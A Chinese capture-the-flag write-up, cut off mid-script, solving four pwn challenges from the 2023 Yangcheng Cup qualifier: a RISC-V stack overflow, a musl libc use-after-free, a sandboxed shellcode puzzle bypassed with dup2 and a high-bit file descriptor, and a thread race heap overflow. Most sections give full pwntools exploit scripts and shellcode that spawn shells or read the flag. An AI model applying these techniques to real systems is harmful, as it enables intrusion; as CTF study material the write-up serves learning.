class="headerlink" title="2023羊城杯初赛"></a>2023羊城杯初赛</h1><p>参考 wp：<a href="http://blog.xmcve.com/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-Writeup/#title-30">星盟</a></p><h2 id="1-risky-login"><a href="#1-risky-login" class="headerlink" title="1. risky_login"></a>1. risky_login</h2><p>risc-v 架构程序下的栈溢出，ida 下无法进行反编译，需要用到 <strong>ghidra</strong>。程序就一个简单的栈溢出和整数溢出，覆盖返回地址为后门函数即可。</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042023909.png" alt="image-20230904202324815"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>, <span class="number">24273</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Input ur name:\n&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span> + p64(backdoor)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Input ur words&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-cookieBox"><a href="#2-cookieBox" class="headerlink" title="2. cookieBox"></a>2. cookieBox</h2><p>musl libc pwn，版本是 v1.1.24，存在 UAF 漏洞。</p><p>需要 patchelf 为目标 libc.so 才能在有 musl 环境的 ubuntu 上运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf ./cookieBox --set-interpreter ./libc.so cookieBox</span><br></pre></td></tr></table></figure><p>通过堆初始化泄露 Libc，通过 UAF，打 unbin 劫持全局变量区域上的堆指针为 __io_FILE，通过 puts 即可触发链子。更详细的细节可以参考另一篇博客<code>musl pwn</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the size:\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">mal = libc_base + <span class="number">0x292ac0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-shellcode"><a href="#3-shellcode" class="headerlink" title="3. shellcode"></a>3. shellcode</h2><p>十分有趣的一道 shellcode 题目，跟着 wp 调试的时候感觉自己想象力还是太匮乏了😵。</p><p>刚开始有个输入 2 字节的输入，一开始不知道怎么利用，看了 wp 才知道 syscall 也是二字节<code>\x0f\x05</code>，后面 call 的时候需要返回到这个上面。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042208620.png" alt="image-20230904220843487" style="zoom: 50%;" /><p>进入关键程序，读入一串长度为 17 的 shellcode 后 call 调用，只允许使用<code>OPQRSTUVWXYZ[\]^_</code> ，且开启了沙箱，只允许 orw。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042215362.png" alt="image-20230904221523314" style="zoom:50%;" /><p>除了 O 以外可以自单编码（即一个字符即可组成一句指令）：</p><table><thead><tr><th align="center">ASCII字符</th><th align="center">HEX</th><th align="center">汇编指令</th></tr></thead><tbody><tr><td align="center">P</td><td align="center">0x50</td><td align="center">push rax</td></tr><tr><td align="center">Q</td><td align="center">0x51</td><td align="center">push rcx</td></tr><tr><td align="center">R</td><td align="center">0x52</td><td align="center">push rdx</td></tr><tr><td align="center">S</td><td align="center">0x53</td><td align="center">push rbx</td></tr><tr><td align="center">T</td><td align="center">0x54</td><td align="center">push rsp</td></tr><tr><td align="center">U</td><td align="center">0x55</td><td align="center">push rbp</td></tr><tr><td align="center">V</td><td align="center">0x56</td><td align="center">push rsi</td></tr><tr><td align="center">W</td><td align="center">0x57</td><td align="center">push rdi</td></tr><tr><td align="center">X</td><td align="center">0x58</td><td align="center">pop rax</td></tr><tr><td align="center">Y</td><td align="center">0x59</td><td align="center">pop rcx</td></tr><tr><td align="center">Z</td><td align="center">0x5a</td><td align="center">pop rdx</td></tr><tr><td align="center">_</td><td align="center">0x5b</td><td align="center">pop rdi</td></tr><tr><td align="center">^</td><td align="center">0x5c</td><td align="center">pop rsi</td></tr><tr><td align="center">\</td><td align="center">0x5d</td><td align="center">pop rsp</td></tr><tr><td align="center">[</td><td align="center">0x5e</td><td align="center">pop rbx</td></tr></tbody></table><p>在程序执行 call shellcode 的时候，我们需要观察一下寄存器以及栈的环境，来看看有哪些可以利用：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042233884.png" alt="image-20230904223352829" style="zoom:50%;" /><p>我们看一下 wp 给的 shellcode，各个指令功能如注释所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi# 给 RSI 赋 RAX ，其实也是 RIP</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax# 给 RAX 赋 RBX = 0</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi# 给 RDI 赋 RBX = 0</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rsp# 抬高 RSP 到 SHELLCODE 附近</span></span><br><span class="line"><span class="string">pop rbp# 给 RBP 赋 0x50f</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp# 压低栈在 shellcode 的结尾，使得执行完 shellcode 可以直接执行 0x50f（syscall）</span></span><br><span class="line"><span class="string">pop rdx# 给 RDX 赋 RBP = 0x50f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>).ljust(<span class="number">17</span>, <span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, RIP, 0x50f)</span></span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042303386.png" alt="image-20230904230350331" style="zoom:50%;" /><p>由此我们可以在栈上写入 orw 的 shellcode，但我们需要观察一下题目的沙箱，可以发现：</p><ol><li>调用 read 函数时其 fd 必须小于等于 2 ，不然直接 kill，但 open 一个文件一般返回的 fd 都是 &gt;= 3。</li><li>调用 write 函数时其 fd 必须大于 2，不然直接 kill。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x12</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0f</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x00000021</span>  <span class="keyword">if</span> (A == dup2) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x25</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x25</span> <span class="number">0x07</span> <span class="number">0x06</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span> <span class="keyword">else</span> gotco <span class="number">0019</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x25</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &lt;= <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>可以发现题目还给了 dup2 系统调用白名单，dup2 介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dup2 可以复制一个现存的文件描述符：int dup2 (int oldfd, int newfd)。</span><br><span class="line">dup2(3, 0) 即将 flag 文件描述符 3 改成了文件描述符 0，即通过文件描述符 0 即可访问到 flag 文件数据。</span><br></pre></td></tr></table></figure><p>因此利用 dup2 可以绕过 read 限制，利用沙箱 fd 和系统调用 fd <strong>数据类型不统一</strong>绕过 write 限制，orw 的 shellcode 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">shellcode2 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub rsp, 0x2000</span></span><br><span class="line"><span class="string">mov eax, 0x67616c66 ;// flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov esi, eax</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall ;// open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov esi, 0</span></span><br><span class="line"><span class="string">mov eax, 33</span></span><br><span class="line"><span class="string">syscall ;// dup2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, 0</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x01010201</span></span><br><span class="line"><span class="string">sub edx, 0x01010101</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall ;// read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rcx, 0x8000000000000000</span></span><br><span class="line"><span class="string">add rdi, rcx</span></span><br><span class="line"><span class="string">syscall ;// write</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>完整 EXP 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">allowed = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>, <span class="number">96</span>):</span><br><span class="line">    allowed += <span class="built_in">chr</span>(i)</span><br><span class="line">log.success(<span class="string">&quot;allowed===&gt;&quot;</span>+allowed)</span><br><span class="line"></span><br><span class="line">syscall = asm(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"><span class="comment"># print(len(syscall))   #2</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;Input: (ye / no)&quot;</span>, syscall)</span><br><span class="line"></span><br><span class="line">shellcode1 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>).ljust(<span class="number">17</span>, <span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(shellcode1))    #17</span></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x14F2)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;[5] ======== Input Your P0P Code ========\n&quot;</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub rsp, 0x2000</span></span><br><span class="line"><span class="string">mov eax, 0x67616c66 ;// flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov esi, eax</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall ;// open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov esi, 0</span></span><br><span class="line"><span class="string">mov eax, 33</span></span><br><span class="line"><span class="string">syscall ;// dup2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, 0</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x0000000000000100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall ;// read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rcx, 0x8000000000000000</span></span><br><span class="line"><span class="string">add rdi, rcx</span></span><br><span class="line"><span class="string">syscall ;// write</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x12</span>+shellcode2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-heap"><a href="#4-heap" class="headerlink" title="4. heap"></a>4. heap</h2><p>菜单题，但是利用<strong>线程</strong>执行堆操作。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309051943811.png" alt="image-20230905194322529" style="zoom:50%;" /><p>edit 中睡眠了 1 秒，存在<strong>条件竞争</strong>，导致了 Heap Overflow。</p><p>Wiki 上找来的条件竞争介绍，由多进程（线程）共享同一数据区域导致的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。这个术语最初来自于两个电信号互相竞争来影响输出结果。</span><br></pre></td></tr></table></figure><p><del>wp 有些看不懂，暂时先不复盘。</del></p><p>可以看到我们在 sleep 前已经拿到了堆块的 index(v2) 和 size(v3)，而在 sleep 的一秒中假设 *(s+v2) 指向处被改变成一个小堆块，岂不是可以进行溢出了？</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141621995.png" alt="image-20230914162125869" style="zoom:50%;" /><p>add 只允许申请 0x50~0x68 大小的堆块，并附带一个 0x10 大小的控制头，控制头中存储着堆块指针和堆块大小。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141944387.png" alt="image-20230914194435059" style="zoom:50%;" /><p>因此假设我们先申请一个 0x68 大小的堆块，在 edit 的 sleep 过程中释放掉该堆块，再申请一个 0x58 大小的堆块，就可以实现 0x10 大小的堆溢出，由此来修改下一个堆块的指针。线程申请的堆块不在 [heap] 下，一般是 libc 附近 mmap 出的一块空间，所以 gdb 调试有些费劲😶（search 调试大法）。</p><p>首先泄露 libc 基址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\xa0\x08&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span 